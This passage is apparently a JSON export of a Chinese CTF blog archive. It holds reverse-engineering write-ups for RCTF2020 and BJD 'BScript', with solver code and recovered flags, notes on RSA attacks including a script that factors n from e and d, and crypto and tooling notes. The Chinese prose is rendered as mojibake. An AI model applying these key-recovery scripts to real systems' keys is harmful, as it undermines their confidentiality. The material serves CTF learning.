\u0026gt;\u0026gt; 3); t = (y ^ i); t -= x; y = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); } t = a ^ b; b = (t \u0026lt;\u0026lt; 61) ^ (t \u0026gt;\u0026gt; 3); t = (a ^ x) - b; a = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); t = b / 0x1000000; if (t == 0x524354467b) { cout\u0026lt;\u0026lt;hex\u0026lt;\u0026lt;\u0026#34;x=\u0026#34;\u0026lt;\u0026lt;t1\u0026lt;\u0026lt;\u0026#34;;\u0026#34;\u0026lt;\u0026lt;endl\u0026lt;\u0026lt;\u0026#34;y=\u0026#34;\u0026lt;\u0026lt;t2\u0026lt;\u0026lt;\u0026#34;;\u0026#34;\u0026lt;\u0026lt;endl; system(\u0026#34;pause\u0026#34;); } } } system(\u0026#34;pause\u0026#34;); return 0; } å¾—åˆ°xã€y\nx = 0x411e3239d455bc70; y = 0x7eb3b6f1136403ac; expï¼š # #include \u0026lt;iostream\u0026gt; #include \u0026lt;stdlib.h\u0026gt; using namespace std; int main() { uint64_t v[10] = { 0x2a00f82be11d77c1, 0xc3b171fc23d591f4, 0x30f11e8bc2885957, 0xd594ab77422feb75, 0xe15d76f0466e98b9, 0xb651fdb55d7736f2, }; for (int j = 0; j \u0026lt; 3; j++) { uint64_t t; uint64_t b = v[j*2]; uint64_t a = v[j * 2+1]; uint64_t x; uint64_t y; int i = 0; x = 0x411e3239d455bc70; y = 0x7eb3b6f1136403ac; uint64_t t1, t2; t1 = x; t2 = y; i = 31; while (i \u0026gt; 0) { i -= 1; t = a ^ b; b = (t \u0026lt;\u0026lt; 61) + (t \u0026gt;\u0026gt; 3); //b1 t = a ^ x; t -= b; a = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); t = x ^ y; x = (t \u0026lt;\u0026lt; 61) + (t \u0026gt;\u0026gt; 3); t = (y ^ i); t -= x; y = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); } t = a ^ b; b = (t \u0026lt;\u0026lt; 61) ^ (t \u0026gt;\u0026gt; 3); t = (a ^ x) - b; a = (t \u0026lt;\u0026lt; 8) + (t \u0026gt;\u0026gt; 56); t = b / 0x1000000; cout \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; b \u0026lt;\u0026lt; a ; } system(\u0026#34;pause\u0026#34;); return 0; } py dome: # import Crypto.Util.number a=0x524354467b393837363233356533613962643639636662366234613364666364626361373066333035346639317d0a00 a = Crypto.Util.number.long_to_bytes(a) print(a) b\u0026rsquo;RCTF{9876235e3a9bd69cfb6b4a3dfcdbca70f3054f91}\n","date":"7 June 2020","permalink":"/achieve/2019to2021/rctf2020%E5%A4%8D%E7%8E%B0wp/","section":"archive","summary":"å¤ªé©¬äº†ã€‚ã€‚ã€‚ã€‚","title":"Rctf2020å¤ç°wp"},{"content":" æŒç»­æ›´æ–°\n\\; è¦å†™æˆ \\\\; \\\\[2ex] è¦å†™æˆ\\\\\\\\[2ex] * æ˜Ÿå·å‘¨å›´ç©ºæ ¼ ","date":"6 June 2020","permalink":"/achieve/2019to2021/mathjax%E5%B8%B8%E7%94%A8/","section":"archive","summary":"æŒç»­æ›´æ–°","title":"MathJaxå¸¸ç”¨ç¬¦å·ä½¿ç”¨ç»†èŠ‚"},{"content":" èŠ±äº†ä¸¤å¤©çœ‹æŠŠåŸºç¡€æ•°è®ºè¿‡äº†ä¸€éï¼Œçœ‹è¿™äº›ä¸œè¥¿çš„æ—¶å€™ç†è§£èµ·æ¥å¿«äº†å¾ˆå¤š\nåŸºæœ¬ç±»å‹ï¼š # 1. \u0026ldquo;è€å¥¶å¥¶ç”¨è„šéƒ½ä¼šåš\u0026quot;çš„æ¿å­é¢˜ # å·²çŸ¥e,p,qæ±‚d\n$d$ = $e^{-1}$ mod $\\phi(n)$\n2. å·²çŸ¥e,d,næ±‚p,q # ç”¨å·²çŸ¥æ¡ä»¶æ˜“äºæ±‚å‡º$N$ã€$\\phi(n)$,åˆ™æœ‰\n$$\\begin{cases} N = p * q \\\\[2ex] \\phi(n)=(q-1)(p-1) \\end{cases} $$\nè”ç«‹å¾—\n$$ \\begin{cases} N-\\phi(n)+1=p+q \\\\[2ex] N=p * q \\end{cases} $$\nå¼•å…¥å˜é‡ X å»ºç«‹ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ï¼ˆæˆ–è€…ç›´æ¥è§£äºŒå…ƒä¸€æ¬¡ï¼‰è§£å‡ºpå’Œq\nä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ‰äº›åœ°æ–¹ç»™çš„åŠæ³•é‚£ä¹ˆéº»çƒ¦ã€‚ã€‚ã€‚\n3.ä½åŠ è§£å¯†æŒ‡æ•°æ”»å‡» # å·²çŸ¥cå’Œå·²çŸ¥eè¿‡å°å°±è¯·ç›´æ¥çˆ†ç ´ ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»-\u0026gt;å¥—ç”¨ä¸­å›½å‰©ä½™å®šç†æ¨¡æ¿ ä½è§£å¯†æŒ‡æ•°æ”»å‡»-\u0026gt;è„šæœ¬æ¢­å“ˆ,è¯•äº†ä¸€ä¸‹ä¸å¥½ç”¨ 4.å…±æ¨¡æ”»å‡» # è‹¥æœ‰ï¼š $gcd(e_1,e_2)=1$ ä¸” $$ \\begin{cases} C_1\\equiv M^{e_1} mod;n \\\\[2ex] C_2\\equiv M^{e_2} mod;n \\end{cases} $$\nä¸€å®šæœ‰ $s_1 * e_1+s_2 * e_2= 1$,ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—å‡º s1 ï¼Œs2\nåˆ™æœ‰ $ \\begin{cases} C_1^{s_1}\\equiv M^{e_1 * s_1} mod;n \\\\[2ex] C_2^{s_2}\\equiv M^{e_2 * s_2} mod;n \\end{cases} \\quad \\Rightarrow C_1^{s_1} * C_2^{s_2} \\equiv M^{e_1 * s_1 + e_2 * s_2}mod;n \\quad \\Rightarrow C_1^{s_1} * C_2^{s_2} \\equiv M mod;n $\n5.å·²çŸ¥dp,dqæ±‚è§£ # å‚è€ƒ 7.5.2 ä½¿ç”¨ä¸­å›½ä½™æ•°å®šç†å¿«é€ŸåŠ è§£å¯†ï¼ˆCRTï¼‰\n6.åŠ å¯†æŒ‡æ•°è¿‡å¤§ï¼ˆeï¼Œnæ¥è¿‘ï¼‰ # wiener-attack\nwienerè„šæœ¬\nå·²çŸ¥ n,e,d æ±‚ q , p # æ¯”è¾ƒå†·çš„å¸¸è§„æ¨¡æ¿ åšæ³•æ¯”è¾ƒ\u0026hellip;çœ‹è„¸\npaper import random def gcd(a, b): if a \u0026lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return a def getpq(n, e, d): p = 1 q = 1 while p == 1 and q == 1: k = d * e - 1 g = random.randint(0, n) while p == 1 and q == 1 and k % 2 == 0: k /= 2 y = pow(g, k, n) if y != 1 and gcd(y-1, n) \u0026gt; 1: p = gcd(y-1, n) q = n/p return (p, q) def main(): \u0026#39;\u0026#39;\u0026#39; n= e= d= \u0026#39;\u0026#39;\u0026#39; p, q = getpq(n, e, d) print( \u0026#34;p=\u0026#34;+hex(p)) print( \u0026#34;q=\u0026#34;+hex(q)) if __name__ == \u0026#39;__main__\u0026#39;: main() ","date":"6 June 2020","permalink":"/achieve/2019to2021/ctf%E4%B8%ADrsa%E5%A5%97%E8%B7%AF/","section":"archive","summary":"èŠ±äº†ä¸¤å¤©çœ‹æŠŠåŸºç¡€æ•°è®ºè¿‡äº†ä¸€éï¼Œçœ‹è¿™äº›ä¸œè¥¿çš„æ—¶å€™ç†è§£èµ·æ¥å¿«äº†å¾ˆå¤š","title":"CTFä¸­RSAå¥—è·¯"},{"content":"\rç§˜é’¥ç”Ÿæˆä¸æ­£ç¡®æ€§ # ç®—æ³•ä¸å†èµ˜è¿°\nRSAç§˜é’¥ç”Ÿæˆ # é€‰æ‹©ä¸¤ä¸ªå¤§ç´ æ•° p ,q è®¡ç®— $n$ = $p * q$ è®¡ç®— $\\phi$( n ) = $( p - 1 )( q - 1 )$ é€‰æ‹© e $\\in$ $Z^m$ ä¸” gcdï¼ˆmï¼Œeï¼‰= 1 è®¡ç®—ç§é’¥ d æ»¡è¶³ d * e = 1 mod $\\phi$(n) RSA æ ¸å¿ƒåŸç† # $C^d$ $\\equiv$ $M^{d * e}$ $\\equiv$ $M$ mod $n$\nç»†èŠ‚å¦‚ä¸‹ï¼š\n$d * e = 1 + t * \\phi(n)$ $M^{d * e}\\equiv M^{1 + t * \\phi(n)}\\equiv M * M^{t * \\phi(n)}\\equiv 1 * M$ mod $n$ 7.5.2 ä½¿ç”¨ä¸­å›½ä½™æ•°å®šç†å¿«é€ŸåŠ è§£å¯†ï¼ˆCRTï¼‰ # çº¦ç®€åŸºå…ƒç´  $M$ï¼š\n$M_p$ $\\equiv$ $M$ mod $p$\n$M_q$ $\\equiv$ $M$ mod $q$\nè®¡ç®—ä¸¤ä¸ªæŒ‡æ•°å¹¶è¿›è¡Œåˆ—å‡ºçš„æŒ‡æ•°è¿ç®—\nä¸¤ä¸ªæŒ‡æ•°ï¼š\n$d_p\\equiv d$ mod $(p-1)$\n$d_q\\equiv d$ mod $(q-1)$\nè¿ç®—ï¼š\n$C_p\\equiv M^{d_p}_p$ mod $p$\n$C_q\\equiv M^{d_q}_q$ mod $q$\né€†å‘æ¢åˆ°é—®é¢˜åŸŸï¼š\n$C$ $\\equiv$ $C_p * M_p * q$ + $C_q * M_q * p$ mod $n$\nå¦‚æœè¦è§£å¯†ä¹Ÿå¯ä»¥ç”¨è¿™ç§ç®—æ³•å¿«é€Ÿç®—å‡ºç»“æœ\n","date":"5 June 2020","permalink":"/achieve/2019to2021/re0%E3%81%AEcrypt2/","section":"archive","summary":"ç§˜é’¥ç”Ÿæˆä¸æ­£ç¡®æ€§ # ç®—æ³•ä¸å†èµ˜è¿°","title":"ä»é›¶å¼€å§‹çš„æ·±å…¥æµ…å‡ºå¯†ç å­¦day 2"},{"content":" ä»Šå¤©æ·±å…¥äº†è§£äº†ä¸€ä¸‹ RSA èƒŒåçš„ä¸€äº›æ•°å­¦åŸç†\n1.4.1 æ¨¡è¿ç®— # .2 ä½™æ•°çš„ä¸å”¯ä¸€æ€§ # ä¾‹ï¼š\n12 $\\equiv$ 3 mod 9 12 $\\equiv$ 21 mod 9 12 $\\equiv$ -6 mod 9 12ã€3ã€21ã€-6éƒ½å±äºä¸€ä¸ªæ•´æ•°é›† {\u0026hellip;-27,-15,-6,3,12,21\u0026hellip;.} è¿™ä¸ªæ•´æ•°é›†æ„æˆä¸€ä¸ªæ‰€è°“çš„ç­‰ä»·ç±»\nå¯¹äºæ¨¡æ•°9æ¥è¯´è¿˜æ‹¥æœ‰å¦å¤– 8 ä¸ªç­‰ä»·ç±»\n{\u0026hellip;.-9 ,0 ,9\u0026hellip;.}\n{\u0026hellip;.-8 ,1 ,10\u0026hellip;.}\n. . .\n{\u0026hellip;.-10 ,-1 ,8\u0026hellip;.}\nå¯¹äºæ¨¡è¿ç®—æ¥è¯´,ç­‰ä»·ç±»æ‰€ä»¥æˆå‘˜çš„è¡Œä¸ºç›¸åŒ\n1.4.2 ç¯ # å®šä¹‰ # å‡è®¾æ•´æ•°ç¯ Zm æœ‰ä»¥ä¸‹ä¸¤éƒ¨åˆ†æ„æˆï¼š\né›†åˆ Zm = {0 ,1 ,2 \u0026hellip;. m-1} ä¸¤ç§æ“ä½œç¬¦ +ã€* ä½¿a ã€b $\\in$ Zm,æœ‰ï¼š a + b $\\equiv$ c mod m\na * b $\\equiv$ d mod m\nç¯ä¸­çš„é€†å…ƒ # ä¸€èˆ¬é€†å…ƒå®šä¹‰ï¼š\nä¸€ä¸ªå¯ä»¥å–æ¶ˆå¦ä¸€ç»™å®šå…ƒç´ è¿ç®—çš„å…ƒç´ \nä½†åœ¨è¿™é‡Œï¼Œä¹˜æ³•é€†å…ƒå®šä¹‰ä¸ºï¼ša * a-1 $\\equiv$ 1 mod m\næ•… 3 * 9 $\\equiv$ 1 mod 26 ä¸­ 9 æ˜¯ 3 çš„é€†å…ƒ\ngcd(a ,m) = 1æ—¶ Zm ä¸­ a çš„é€†å…ƒå­˜åœ¨ï¼ˆäº’è´¨ï¼‰\n6.3.2 æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•(EEA) # gcd()ç”¨ç†Ÿæ‚‰çš„è¾—è½¬ç›¸é™¤æ³•å‘ä»‹ç»äº†å¦‚ä½•æ±‚æœ€å¤§å…¬å› æ•°, EEA ç®—æ³•åˆ™æœ€ç»ˆå¯ä»¥æ±‚å¾— Zm ä¸­ a çš„é€†å…ƒ ï¼ˆå‰ææ˜¯å­˜åœ¨é€†å…ƒï¼‰\nè®¾æ­£æ•´æ•° r0 ï¼Œ r1 ä¸” r0\u0026gt;r1\nEAAç®—æ³•æœ€ç»ˆå¯ä»¥å¾—åˆ°ä¸¤ä»½å‚æ•°ï¼š\ngcd(r0 ,r1) è¿”å›çš„æœ€å¤§å…¬å› æ•° gcd(r0 ,r1) = s * r1 + t * r0 ä¸­çš„ t ã€s å½“ gcd( m , a) = 1 æ—¶ï¼Œæœ‰ s * m + t * r1 = 1\nåˆ™ s * 0 + t * r1 $\\equiv$ 1 mod m\nt ä¸º r1 çš„é€†å…ƒ\nå‡ ä¸ªåŸºç¡€çš„å‡½æ•°å’Œå®šç† # åŸºç¡€ä¸­çš„åŸºç¡€\næ¬§æ‹‰å‡½æ•° # è¿”å› Zm å†…ä¸ m äº’è´¨çš„æ•´æ•°çš„ä¸ªæ•°\n$\\phi$( m ) = $\\prod_1^n$ ( Pie - Pie-1 )\nä¾‹\n$\\phi$( 240 ) = 24 * 3 * 5 = ( 24 - 23 )( 3 - 1 )( 5 - 1 ) = 64\nè´¹é©¬å°å®šç† # ap $\\equiv$ a mod p \u0026ndash;\u0026gt; ap-1 $\\equiv$ 1 mod p\næ¬§æ‹‰å®šç† # aã€méƒ½æ˜¯æ•´æ•°ï¼Œä¸”äº’è´¨ï¼Œåˆ™æœ‰: a $\\phi$( m ) $\\equiv$ 1 mod m\n","date":"4 June 2020","permalink":"/achieve/2019to2021/re0%E3%81%AEcrypt1/","section":"archive","summary":"ä»Šå¤©æ·±å…¥äº†è§£äº†ä¸€ä¸‹ RSA èƒŒåçš„ä¸€äº›æ•°å­¦åŸç†","title":"ä»é›¶å¼€å§‹çš„æ·±å…¥æµ…å‡ºå¯†ç å­¦day 1"},{"content":"\rå¸¸è§å‡ ç§ï¼š # (a \u0026amp; ~(b \u0026amp; a) |~(b \u0026amp; a) \u0026amp; b) (a | b) \u0026amp; ( ~a | ~b ) ~(~a \u0026amp; ~b) \u0026amp; ~(a \u0026amp; b) (a \u0026amp; ~b)|(~a \u0026amp; b) ç†è®ºåŸºç¡€ï¼š # æ”¶é›†æ¥çš„èµ„æ–™é‡Œé¢æåˆ°äº† åæ¼”è§„åˆ™ å’Œ å¯¹å¶è§„åˆ™\nå¯¹äºä»»æ„ä¸€ä¸ªå‡½æ•°è¡¨è¾¾å¼Yï¼Œå¦‚æœæŠŠYä¸­æ‰€æœ‰çš„â€œä¸â€æ¢æˆâ€œæˆ–â€ï¼Œâ€œæˆ–â€æ¢æˆâ€œä¸â€ï¼›â€œ0â€æ¢æˆâ€œ1â€ï¼Œâ€œ1â€æ¢æˆâ€œ0â€ï¼›åŸå˜é‡æ¢æˆåå˜é‡ï¼Œåå˜é‡æ¢æˆåŸå˜é‡ï¼Œå³å¾—åˆ°ä¸€ä¸ªæ–°çš„å‡½æ•°è¡¨è¾¾å¼Yéï¼Œç§°Yéä¸ºåŸå‡½æ•°Yçš„åå‡½æ•°ã€‚ å¯¹äºä»»ä½•ä¸€ä¸ªé€»è¾‘è¡¨è¾¾å¼F,å¦‚æœå°†å¼ä¸­æ‰€æœ‰çš„â€œÂ·â€æ¢æˆâ€œ+â€,â€œ+â€æ¢æˆâ€œÂ·â€,â€œ0â€æ¢æˆâ€œ1â€,â€œ1â€æ¢æˆâ€œ0â€,è€Œå˜é‡ä¿æŒä¸å˜å°±å¾—åˆ°è¡¨è¾¾å¼F\u0026rsquo;ï¼Œè¿™ä¸ªè¡¨è¾¾å¼F\u0026rsquo;ç§°ä¸ºFçš„å¯¹å¶å¼ï¼Œè¿™ä¸€å˜æ¢æ–¹å¼ç§°ä¸ºå¯¹å¶è§„åˆ™ã€‚\nä»¥æ­¤å¯è§ç”¨ä¸ã€æˆ–ã€éå®ç°å¼‚æˆ–çš„æ–¹å¼å¹¶ä¸åªæœ‰ä¸Šé¢é‚£å‡ ç§ï¼Œåªæœ‰ç¬¦åˆä¸€å®šçš„æ•°å­¦åŸç†å°±å¯ä»¥å®ç°\nç­‰æœ‰æ—¶é—´äº†å°±å»å¥½å¥½ç ”ç©¶ç ”ç©¶ã€‚ã€‚ã€‚\n","date":"28 May 2020","permalink":"/achieve/2019to2021/%E4%B8%8E%E6%88%96%E9%9D%9E%E8%A1%A8%E7%A4%BA%E5%BC%82%E6%88%96/","section":"archive","summary":"å¸¸è§å‡ ç§ï¼š # (a \u0026amp; ~(b \u0026amp; a) |~(b \u0026amp; a) \u0026amp; b) (a | b) \u0026amp; ( ~a | ~b ) ~(~a \u0026amp; ~b) \u0026amp; ~(a \u0026amp; b) (a \u0026amp; ~b)|(~a \u0026amp; b) ç†è®ºåŸºç¡€ï¼š # æ”¶é›†æ¥çš„èµ„æ–™é‡Œé¢æåˆ°äº† åæ¼”è§„åˆ™ å’Œ å¯¹å¶è§„åˆ™","title":"ç”¨ä¸ã€æˆ–ã€éè¡¨ç¤ºå¼‚æˆ–çš„å‡ ç§æ–¹å¼"},{"content":" å¦‚æœæ™®é€šç”¨æˆ·æ— æ³•æ˜¾ç¤ºå…ˆæ£€æŸ¥$ ~/.zshrcçš„æƒé™ çœŸ-rootæ— æ³•äº«å—zsh æ— æ³•æ­£å¸¸æ˜¾ç¤ºå…ˆæ£€æŸ¥å­—ä½“æ˜¯å¦å‡ºé”™ï¼Œå­—ä½“çš„åç§°è¦æ‰“å¼€å­—ä½“æ‰èƒ½çœ‹è§ windowsèµ„æºç®¡ç†å™¨è®¿é—®wslç³»ç»Ÿæ–‡ä»¶å¤¹å¯èƒ½ä¼šæ”¹å˜æ–‡ä»¶æƒé™ï¼Œæœ€åè¿˜å¾—æ‰‹åŠ¨æ”¹ï¼Œå¾ˆçƒ¦ åˆ«äººçš„å‰ç«¯æ°¸è¿œæœ€å¥½çœ‹ ","date":"28 May 2020","permalink":"/achieve/2019to2021/wsl%E7%BE%8E%E5%8C%96/","section":"archive","summary":"å¦‚æœæ™®é€šç”¨æˆ·æ— æ³•æ˜¾ç¤ºå…ˆæ£€æŸ¥$ ~/.","title":"wsl + zshè¿›è¡Œç¾åŒ–æ—¶çš„æ³¨æ„äº‹é¡¹"},{"content":" æˆ‘å°±æ˜¯é“åºŸç‰©äº†ï¼Œæ•´åœºæ¯”èµ›åªåšå‡ºæ¥ä¸¤ä¸ªé¢˜\nViQinere # expæ‰¾ä¸åˆ°äº†ã€‚ã€‚ã€‚orz æ€»ä¹‹è¿æ¥é¢˜ç›®ç»™çš„ipåœ°å€ï¼Œä¼šè¿”å›ä¸€ä¸²å¯†æ–‡ï¼Œåˆ†æä¸€ä¸‹ç®—æ³•å°±å¯ä»¥å›å»å¼€å¼€å¿ƒå¿ƒå†™çˆ†ç ´äº†\nBScript # å› ä¸ºé˜Ÿå‹å§winç¯å¢ƒææ²¡äº†ï¼Œæ‰€ä»¥æˆ‘å°±å…ˆæäº†ä¸¤ä¸ªpeæ–‡ä»¶ï¼Œä¸å¾—ä¸è¯´å‡ºé¢˜äººçœŸæœ‰ä½ çš„å•Šã€‚ã€‚ã€‚ä»0å¼€å§‹çš„æ–‡ä»¶æ“ä½œäº†è§£ä¸€ä¸‹\næŠŠåŠ å¯†flagçš„æ–‡ä»¶æ‹†æˆ800å¤šåˆ†ï¼Œåˆ†åˆ«æ”¾åˆ°800å¤šä¸ªåŠ äº†upxå£³çš„æ–‡ä»¶é‡Œé¢\nemmmmï¼Œå¥½å§å…ˆè„±å£³\nè„±å£³demoï¼š # #include \u0026lt;iostream\u0026gt; #include \u0026lt;stdlib.h\u0026gt; using namespace std; int main() { for(int i=0;i\u0026lt;804;i++) { char x[5]; memset(x, 0, sizeof(x)); itoa(i,x,10); char s[20] = \u0026#34;upx -d BScript/\u0026#34;; strcat( s ,x); char s1[10] = \u0026#34;.exe\u0026#34;; strcat(s, s1); system(s); } //system(s); system(\u0026#34;pause\u0026#34;); } è„±å®Œå£³åéšä¾¿æ‰“å¼€å‡ ä¸ªåˆ°idaé‡Œé¢çœ‹çœ‹ï¼Œå‘ç°ä¸åŒçš„æ–‡ä»¶é‡Œé¢çš„å˜é‡ansæˆ–å˜é‡keyé‡Œé¢æ”¾äº†ä¸€å°æ®µpeæ–‡ä»¶çš„ä¿¡æ¯\n__main(); puts(\u0026#34;What a easy RE!\u0026#34;); while ( i ) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4 + i); if ( *(\u0026amp;v4 + i) != ans[63 - i] )//ansé‡Œé¢å€’åºæ”¾ç½®64ä¸ª byte çš„ä¿¡æ¯ { puts(\u0026#34;Are you a fool?\u0026#34;); exit(0); } --i; ç„¶ååœ¨å†™å‡ ä¸ªdemoå¯¹æ‰€æœ‰peæ–‡ä»¶çš„ç±»å‹åˆ†æä¸€ä¸‹ï¼Œå‘ç°800ä¸ªæ–‡ä»¶åªæœ‰ä¸¤ç§ä¸åŒçš„å¤§å°ï¼Œç›¸åŒå¤§å°çš„æ–‡ä»¶ä¸­æ”¾peæ–‡ä»¶çš„ä¿¡æ¯çš„ä½ç½®æ˜¯ä¸€æ ·çš„\nFILE *fp = NULL; fp = fopen(\u0026#34;BScript\\\\1~804.exe\u0026#34; , \u0026#34;rb\u0026#34;); fseek(fp,0,SEEK_END); int size = ftell(fp);//è¿™æ ·å¯ä»¥å¾—åˆ°æ–‡å¤§å° cheak(size); æ–‡ä»¶å¤§å° peä¿¡æ¯ä½ç½® é•¿åº¦ 0xBE03 0x1C40 64 é€†åº 0xBDF1 0x1c20 32 æ­£åº ç„¶åç»§ç»­æ’¸è„šæœ¬æŠŠæ–‡ä»¶æå–å‡ºæ¥ï¼Œå…ˆæ–°å»ºä¸€ä¸ªç©ºçš„â€œnewâ€æ–‡ä»¶åœ¨æ‰§è¡Œä»¥ä¸‹ä»£ç \ndemo: # #include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;stdlib.h\u0026gt; using namespace std; int main() { for (int i = 0; i \u0026lt; 804; i++) { char fname[20] = \u0026#34;BScript\\\\\u0026#34;; char s[20]; memset(s, 0, sizeof(s)); itoa(i, s, 10); strcat(fname, s); strcat(fname, \u0026#34;.exe\u0026#34;); char s2[100]; memset(s2, 0, sizeof(s2)); FILE *fr = NULL; fr = fopen(fname, \u0026#34;rb\u0026#34;); fseek(fr,0,SEEK_END); int size = ftell(fr); //printf(\u0026#34;%X\u0026#34;,size); if (size == 48643) { fseek(fr, 0x1C40, SEEK_SET); fread(\u0026amp;s2, 1, 0x40, fr); fclose(fr); FILE *NewFile = NULL; NewFile = fopen(\u0026#34;new\u0026#34;, \u0026#34;ab\u0026#34;); for (int i = 0x40 - 1; i \u0026gt;= 0; i--) fwrite(\u0026amp;s2[i], 1, 1, NewFile); } else if (size == 48625) { fseek(fr, 0x1C20, SEEK_SET); fread(\u0026amp;s2, 1, 0x20, fr); fclose(fr); FILE *NewFile = NULL; NewFile = fopen(\u0026#34;new\u0026#34;, \u0026#34;ab\u0026#34;); for (int i = 0; i \u0026lt; 0x20; i++) fwrite(\u0026amp;s2[i], 1, 1, NewFile); } } system(\u0026#34;pause\u0026#34;); } åŸè°…å¼Ÿå¼Ÿæˆ‘åªä¼šç”¨Cè¯­è¨€å†™æ–‡ä»¶æ“ä½œï¼Œå†™çš„è¿˜å¾ˆä¸‘\nå®Œå·¥åå¾—åˆ° New æ‹–è¿›idaå‘ç°å¹¶æ²¡æœ‰æˆ‘ä»¬è‹¦è‹¦è¿½å¯»çš„å­—ç¬¦ä¸²ã€‚ã€‚ã€‚é‚£å°±å…ˆçœ‹çœ‹å‰å‡ ä¸ªæœ€æœ‰å¸Œæœ›çš„å‡½æ•°ï¼Œæœç„¶åœ¨å‰å‡ ä¸ªå‡½æ•°ä¸­å‘ç°äº†æˆ‘ä»¬æ„Ÿå…´è¶£çš„ä»£ç \nåœ¨ 0x004015C0 å¤„çš„å‡½æ•°æ˜¯ä¸ªæ ‡å‡†çš„base64ï¼Œäº¤å‰å¼•ç”¨ä¸€ä¸‹å¯ä»¥å°åˆ€è¾“å…¥çš„ä½ç½®å’Œåˆ¤æ–­çš„ä½ç½®ï¼Œè¿›è¡Œæ‰¾ä¸€ä¸‹å¯ä»¥åœ¨ 0x00401BEEå¤„çš„å‡½æ•°äº†æ‰¾åˆ°ç»™å¯†æ–‡èµ‹å€¼çš„è¯­å¥\nç¨å¾®æ³¨æ„ä¸€ä¸‹èµ‹å€¼çš„åœ°å€å°±å¯ä»¥æŠŠå¯†æ–‡æ‹¼å‡ºæ¥äº†\n0x00401AD7å¤„ int __cdecl fun(int a1) { tab = \u0026#39;Q\u0026#39;; byte_40D041 = \u0026#39;k\u0026#39;; byte_40D042 = \u0026#39;p\u0026#39;; byte_40D043 = \u0026#39;E\u0026#39;; byte_40D044 = \u0026#39;e\u0026#39;; byte_40D045 = \u0026#39;1\u0026#39;; byte_40D046 = \u0026#39;d\u0026#39;; byte_40D047 = \u0026#39;o\u0026#39;; byte_40D048 = \u0026#39;T\u0026#39;; byte_40D049 = \u0026#39;3\u0026#39;; byte_40D04A = \u0026#39;R\u0026#39;; byte_40D04B = \u0026#39;f\u0026#39;; byte_40D04C = \u0026#39;N\u0026#39;; byte_40D04D = \u0026#39;F\u0026#39;; byte_40D04E = \u0026#39;9\u0026#39;; byte_40D04F = \u0026#39;i\u0026#39;; byte_40D050 = \u0026#39;Y\u0026#39;; byte_40D051 = \u0026#39;W\u0026#39;; byte_40D052 = \u0026#39;V\u0026#39;; byte_40D053 = \u0026#39;1\u0026#39;; byte_40D054 = \u0026#39;d\u0026#39;; v1 = sub_401E7C(\u0026#39;2\u0026#39;); v2 = v1; v3 = (_BYTE *)v1; for ( i = 49; i \u0026gt;= 0; --i ) *v3++ = 0; v7 = v2; v5 = sub_401ECC(a1, (int)v3); unk_40E2C0(v7, 41, v5); for ( j = 0; ((int (__cdecl *)(int))dword_407C68[0])(v7) \u0026gt; j; ++j ) ++*(_BYTE *)(j + v7); return v7; } 0x004019FFå¤„ int __usercall fun2@\u0026lt;eax\u0026gt;(int a1@\u0026lt;edx\u0026gt;, int a2, int a3) { f((int)\u0026amp;v4, a1); f_0(a2, a3, (int)\u0026amp;v4); f_1((int)\u0026amp;v4); byte_40D055 = 68; byte_40D056 = 70; byte_40D057 = 109; byte_40D058 = 100; byte_40D059 = 84; byte_40D05A = 70; byte_40D05B = 102; byte_40D05C = 99; byte_40D05D = 50; byte_40D05E = 78; byte_40D05F = 121; byte_40D060 = 98; byte_40D061 = 72; byte_40D062 = 66; byte_40D063 = 48; byte_40D064 = 102; byte_40D065 = 81; byte_40D066 = 65; byte_40D067 = 65; return a2; } ç„¶åå°±å¯ä»¥æ’¸expäº† ä¸è¦å¿˜äº†æŒ‰å‡ºé¢˜äººçš„æ„æ€æŠŠflagè½¬æˆ32ä½å°å†™md5å€¼\nexp: # import base64 import hashlib l = [\u0026#39;Q\u0026#39;, \u0026#39;k\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;E\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;T\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;W\u0026#39;, \u0026#39;V\u0026#39;, \u0026#39;1\u0026#39;,\u0026#39;d\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;T\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;H\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;Q\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;A\u0026#39;] s = b\u0026#39;QkpEe1doT3RfNF9iYWV1dDFmdTFfc2NybHB0fQAA\u0026#39; s1 = base64.b64decode(s) print(s1) flag = b\u0026#34;BJD{WhOt_4_baeut1fu1_scrlpt}\u0026#34; #\u0026#34;BJD{WhOt_4_baeut1fu1_scrlpt}\u0026#34; f = hashlib.md5() f.update(flag) print(f.hexdigest()) #e801bcbcc42d3120d910ccc46ae640dd å¦‚æœä¸Šäº¤buuçš„è¯åº”è¯¥æ˜¯ flag{e801bcbcc42d3120d910ccc46ae640dd}\nä»¥ä¸‹ä¸ºå¤ç°é¢˜ç›®\nBlink: # 